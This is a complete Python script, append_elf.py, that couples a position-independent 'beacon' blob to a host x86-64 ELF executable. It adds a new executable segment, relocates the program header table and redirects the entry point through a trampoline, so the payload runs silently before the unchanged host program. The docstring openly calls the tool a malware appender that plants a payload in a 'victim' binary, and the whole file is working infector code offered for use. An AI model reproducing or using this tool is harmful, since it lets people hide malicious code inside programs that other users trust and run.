#!/usr/bin/env python3
"""append_elf.py — couple a PIC x86-64 beacon to a host ELF executable.

Given a host ELF64 (PIE or non-PIE, static or linked — anything the kernel
will map via its program headers) and a position-independent blob, produce a
new ELF in which:

  * every host byte is untouched (headers, segments, sections, code);
  * appended at the end of the file, page-aligned, one new PT_LOAD (R|X)
    holds:  [trampoline][beacon blob][relocated program header table];
  * e_entry is re-pointed at the trampoline;
  * e_phnum is incremented and e_phoff re-pointed at the relocated table,
    whose PT_PHDR entry is updated to match. The kernel reads phdrs straight
    from e_phoff and glibc's ld.so walks from PT_PHDR, so relocating the
    table is legal and needs zero room inside the original image — which is
    exactly what makes this work on dense, fully-packed gcc outputs.

The trampoline is exactly:

    E8 05 00 00 00     call +5   -> the beacon (10 bytes further on)
    E9 xx xx xx xx     jmp      -> the ORIGINAL e_entry

so execution is: kernel -> beacon (saves every GPR, writes its token,
restores everything, `ret`s) -> jmp -> original entry -> the host runs
exactly as if nothing happened, having already paid for the malware. That is
the classic appender deployment: the victim binary is "coupled" with the
payload without a single host byte changing.

The beacon must be PIC (RIP-relative only) and must behave as a proper
function: save/restore every general register and `ret`. See beacon_linux.asm.

Usage: append_elf.py <host.elf> <blob.bin> <out.elf>
Exit 0 on success, 2 on a rejected input.
"""

import os
import struct
import sys
from pathlib import Path

PHDR = 56
PT_LOAD = 1
PT_PHDR = 6
PF_R, PF_W, PF_X = 4, 2, 1
PAGE = 0x1000


def fail(msg: str) -> None:
    print(f"append_elf: {msg}", file=sys.stderr)
    sys.exit(2)


def main() -> int:
    if len(sys.argv) != 4:
        fail("usage: append_elf.py <host.elf> <blob.bin> <out.elf>")
    host = Path(sys.argv[1]).read_bytes()
    blob = Path(sys.argv[2]).read_bytes()

    if host[:4] != b"\x7fELF":
        fail("host is not an ELF")
    if host[4] != 2 or host[5] != 1:  # EI_CLASS=64, EI_DATA=LE
        fail("host must be a little-endian ELF64")
    if struct.unpack_from("<H", host, 18)[0] != 62:  # EM_X86_64
        fail("host must be x86-64")

    e_entry = struct.unpack_from("<Q", host, 0x18)[0]
    e_phoff = struct.unpack_from("<Q", host, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", host, 0x36)[0]
    e_phnum = struct.unpack_from("<H", host, 0x38)[0]

    if e_phentsize != PHDR:
        fail(f"unexpected phdr entsize {e_phentsize}")
    if e_phoff + e_phnum * PHDR > len(host):
        fail("phdr table runs past EOF")

    phdrs = []
    loads = []
    for i in range(e_phnum):
        o = e_phoff + i * PHDR
        phdrs.append(host[o:o + PHDR])
        p_type, = struct.unpack_from("<I", host, o)
        (p_offset, p_vaddr, _p_paddr,
         p_filesz, p_memsz, _p_align) = struct.unpack_from("<6Q", host, o + 8)
        if p_type == PT_LOAD:
            loads.append((p_vaddr, p_memsz))

    if not loads:
        fail("host has no PT_LOAD segments")

    # --- layout of the appended region (page aligned) -----------------------
    #   [trampoline: 10][blob][new phdr table: (n+1) * 56]
    table_sz = (e_phnum + 1) * PHDR
    F = (-len(host)) % PAGE + len(host)          # file offset of region start
    hi = max(v + m for v, m in loads)
    V = (hi + PAGE - 1) // PAGE * PAGE + PAGE    # fresh page above all loads
    if (V - F) % PAGE:
        fail("internal: append not page-coherent")

    blob_off = 10
    table_off = blob_off + len(blob)
    disp = e_entry - (V + 10)
    if not (-0x80000000 <= disp < 0x80000000):
        fail(f"original entry 0x{e_entry:x} out of trampoline reach "
             f"(region at 0x{V:x})")

    tramp = b"\xE8\x05\x00\x00\x00\xE9" + struct.pack("<i", disp)
    region = tramp + blob
    out = bytearray(host)
    out += b"\x00" * (F - len(host))

    # --- relocated phdr table ------------------------------------------------
    new_phdrs = bytearray()
    for ph in phdrs:
        p_type, p_flags = struct.unpack_from("<II", ph, 0)
        if p_type == PT_PHDR:
            ph = bytearray(ph)
            struct.pack_into("<Q", ph, 8, F + table_off)     # p_offset
            struct.pack_into("<Q", ph, 16, V + table_off)    # p_vaddr
            struct.pack_into("<Q", ph, 24, V + table_off)    # p_paddr
        new_phdrs += bytes(ph)
    new_phdrs += struct.pack(
        "<II6Q",
        PT_LOAD,
        PF_R | PF_X,
        F, V, V,
        len(tramp) + len(blob) + table_sz,
        len(tramp) + len(blob) + table_sz,
        PAGE,
    )
    region += bytes(new_phdrs)
    out += region

    struct.pack_into("<Q", out, 0x18, V)          # e_entry -> trampoline
    struct.pack_into("<Q", out, 0x20, F + table_off)  # e_phoff -> new table
    struct.pack_into("<H", out, 0x38, e_phnum + 1)    # e_phnum

    out_path = Path(sys.argv[3])
    out_path.write_bytes(bytes(out))
    if os.access(sys.argv[1], os.X_OK):  # keep the victim executable
        st = out_path.stat()
        out_path.chmod(st.st_mode | 0o111)
    print(f"appended: region file 0x{F:x} -> vaddr 0x{V:x} "
          f"(tramp 10 B, blob {len(blob)} B, phdrs {table_sz} B)")
    print(f"segment:  new PT_LOAD r-x file 0x{F:x} -> vaddr 0x{V:x}, "
          f"filesz 0x{len(tramp) + len(blob) + table_sz:x}")
    print(f"entry:    0x{e_entry:x} -> 0x{V:x} (call blob, jmp old entry)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
